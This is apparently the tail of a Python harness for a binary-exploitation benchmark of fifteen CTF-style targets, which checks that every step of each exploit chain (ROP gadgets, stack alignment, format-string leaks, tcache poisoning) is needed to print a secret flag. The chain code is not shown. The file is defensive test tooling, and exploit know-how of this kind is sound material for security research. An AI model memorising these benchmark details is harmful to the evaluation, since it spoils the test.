    Case("no_win_address", "overflow with padding only -- no gadget chain at all",
         {"include_win": False}),
    Case("no_gadget_direct_to_win", "overwrite the return address directly with win(), "
         "skipping pop_rdi_gadget -- rdi holds whatever garbage the ABI left",
         {"use_gadget": False}),
    Case("wrong_magic_argument", "load the gadget correctly but pass the wrong magic value",
         {"correct_magic": False}),
    # win() calls fopen()/fgets() via print_flag(), and fopen()'s internal
    # malloc() uses SIMD-aligned stack accesses that fault if entered off the
    # ABI-mandated 16-byte boundary -- confirmed empirically (BLOCKED, not a
    # relaxation): dropping this ret crashes the chain before win() ever
    # reaches the magic check.
    Case("no_alignment_ret", "drop the parity-fixing bare ret before pop_rdi_gadget "
         "-> fopen()'s internal malloc() faults on a misaligned stack",
         {"align_ret": False}),
]


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #
@dataclass
class Suite:
    slug: str
    chain: Callable
    cases: list
    prepare: Callable | None = None


SUITES = [
    Suite("01_stack_shellcode_relay", chain_01, CASES_01),
    Suite("02_ret2plt_strcat_system", chain_02, CASES_02),
    Suite("03_pie_write_leak_ret2libc", chain_03, CASES_03),
    Suite("04_canary_relay_bypass", chain_04, CASES_04),
    Suite("05_fmtstr_pie_leak", chain_05, CASES_05,
          prepare=lambda t: {"leak_index": find_leak_index(t)}),
    Suite("06_fmtstr_short_write", chain_06, CASES_06),
    Suite("07_static_ret2syscall", chain_07, CASES_07),
    Suite("08_int_mul_overflow", chain_08, CASES_08),
    Suite("09_heap_dangling_global", chain_09, CASES_09),
    Suite("10_ret2csu_execve", chain_10, CASES_10),
    Suite("11_heap_overflow_tcache_poison", chain_11, CASES_11),
    Suite("12_fmtstr_got_overwrite", chain_12, CASES_12,
          prepare=lambda t: {"fmt_offset": find_fmt_offset(t)}),
    Suite("13_off_by_one_retaddr_lsb", chain_13, CASES_13),
    Suite("14_oob_read_flag_array", chain_14, CASES_14),
    Suite("15_ret2win_arg_gate", chain_15, CASES_15),
]


def provision(corpus, slug: str, rebuild: bool) -> Target:
    """Give the target a fresh secret flag (or, with --no-rebuild, use whatever
    the corpus currently holds). Raises ProvisionError with a friendly message
    rather than a traceback."""
    if rebuild:
        rb.build_with_secret(corpus, slug, rb.mint_secret_flag())

    binary, flag_file = corpus.binary(slug), corpus.flag_file(slug)
    if not binary.is_file():
        raise rb.ProvisionError(
            f"{binary} is not built -- run benchmark/build_all_r2.sh (or drop "
            f"--no-rebuild and let this script build it)")
    if not flag_file.is_file():
        raise rb.ProvisionError(
            f"{flag_file} is missing -- run benchmark/build_all_r2.sh")
    flag = flag_file.read_text().strip()
    if not flag:
        raise rb.ProvisionError(f"{flag_file} is empty; nothing to check against")
    return Target(slug=slug, binary=str(binary),
                  target_dir=str(corpus.target_dir(slug)), flag=flag.encode())


def main() -> int:
    global IO_TIMEOUT
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--case", action="append", default=[], metavar="PREFIX",
                    help="only run targets starting with PREFIX "
                         "(repeatable, e.g. --case 04 --case 12)")
    ap.add_argument("--list", action="store_true", help="list cases and exit")
    ap.add_argument("--timeout", type=float, default=IO_TIMEOUT,
                    help="per-read timeout in seconds (default: %(default)s)")
    ap.add_argument("--no-rebuild", action="store_true",
                    help="use the corpus as it stands instead of rebuilding "
                         "each target with a fresh secret flag")
    ap.add_argument("--corpus-root", type=Path, default=DEFAULT_CORPUS_DIR_R2,
                    help="corpus directory (default: %(default)s)")
    ap.add_argument("--manifest", type=Path, default=DEFAULT_CORPUS_YAML_R2,
                    help="corpus manifest (default: %(default)s)")
    args = ap.parse_args()
    IO_TIMEOUT = args.timeout

    wanted = SUITES
    if args.case:
        wanted = [s for s in SUITES
                  if any(s.slug.startswith(p) or s.slug.split("_")[0] == p.zfill(2)
                         for p in args.case)]
        if not wanted:
            print(f"error: no target matched {args.case}", file=sys.stderr)
            return 2

    if args.list:
        for s in wanted:
            print(f"\n{s.slug}  ({len(s.cases)} ablations)")
            for c in s.cases:
                tag = "" if c.expect_blocked else "   [RELAXATION probe]"
                print(f"    {c.name:<28} {c.why}{tag}")
        total = sum(len(s.cases) for s in wanted)
        print(f"\n{total} ablations across {len(wanted)} targets")
        return 0

    if not args.corpus_root.is_dir():
        print(f"error: corpus root not found: {args.corpus_root}", file=sys.stderr)
        return 2
    if not args.manifest.is_file():
        print(f"error: corpus manifest not found: {args.manifest}", file=sys.stderr)
        return 2

    corpus = rb.Corpus(root=args.corpus_root.resolve(),
                       manifest=args.manifest.resolve())
    print(f"corpus: {corpus.root}")
    print("each target is rebuilt with a FRESH RANDOM secret before its cases"
          if not args.no_rebuild else
          "--no-rebuild: using the corpus and flag.txt as they stand")
    print()

    leaks, setup_failed, surprises, n_blocked = [], [], [], 0

    # Serialise against run_bench.py / the soundness probes: a rebuilding run
    # rewrites each target's binary and flag.txt as it goes.
    with rb.corpus_lock(corpus):
        for s in wanted:
            print(f"=== {s.slug} " + "=" * (60 - len(s.slug)))
            try:
                t = provision(corpus, s.slug, rebuild=not args.no_rebuild)
            except rb.ProvisionError as e:
                print(f"  NOT MEASURABLE: {str(e)[:150]}\n")
                setup_failed.append(s.slug)
                continue

            t.notes = {}
            if s.prepare:
                try:
                    t.notes = s.prepare(t)
                    print(f"  discovery: {t.notes}")
                except Exception as e:
                    print(f"  DISCOVERY FAILED: {type(e).__name__}: {e}\n")
                    setup_failed.append(s.slug)
                    continue

            # Positive control FIRST: without it, "BLOCKED" everywhere could
            # just mean this file is broken.
            out, err = run_chain(s.chain, t, {})
            if t.flag not in out:
                print(f"  POSITIVE CONTROL FAILED ({err or 'no flag'}) -- "
                      f"ablations for this target are not interpretable\n")
                setup_failed.append(s.slug)
                continue
            print("  positive control             intact chain -> FLAG (baseline ok)")

            for c in s.cases:
                out, err = run_chain(s.chain, t, c.kw)
                got = t.flag in out
                if got and c.expect_blocked:
                    verdict = "*** NOT BLOCKED -- FLAG STILL APPEARS ***"
                    leaks.append((s.slug, c))
                elif got:
                    verdict = "RELAXATION confirmed (flag still appears, as expected)"
                elif not c.expect_blocked:
                    verdict = "*** relaxation probe was BLOCKED (step matters) ***"
                    surprises.append((s.slug, c))
                else:
                    verdict = "no-flag (BLOCKED)"
                    n_blocked += 1
                note = f"  [{err}]" if err and not got else ""
                print(f"  {c.name:<28} {verdict}{note}")
            print()

    print("=" * 72)
    print(f"{n_blocked} strict ablations BLOCKED the flag as required")
    if leaks:
        print(f"\n*** {len(leaks)} ABLATION(S) STILL PRODUCED THE FLAG ***")
        print("These targets do not measure the step that was removed:")
        for slug, c in leaks:
            print(f"  {slug:<32} {c.name:<28} {c.why}")
    if surprises:
        print(f"\n{len(surprises)} relaxation probe(s) were blocked after all "
              f"(the detail IS load-bearing):")
        for slug, c in surprises:
            print(f"  {slug:<32} {c.name}")
    if setup_failed:
        print(f"\n{len(setup_failed)} target(s) not measurable this run: "
              f"{', '.join(setup_failed)}")

    # 1 is reserved for "a chain step turned out to be unnecessary", i.e. a
    # corpus defect. A target we could not measure is a setup problem (2), so
    # the two never get confused by a caller that only checks for nonzero.
    if leaks or surprises:
        print("\nFAIL: a chain step is not necessary -- that target measures "
              "something easier than it claims.", file=sys.stderr)
        return 1
    if setup_failed:
        print("\nINCOMPLETE: some targets could not be measured; the result "
              "above is not a clean bill of health.", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
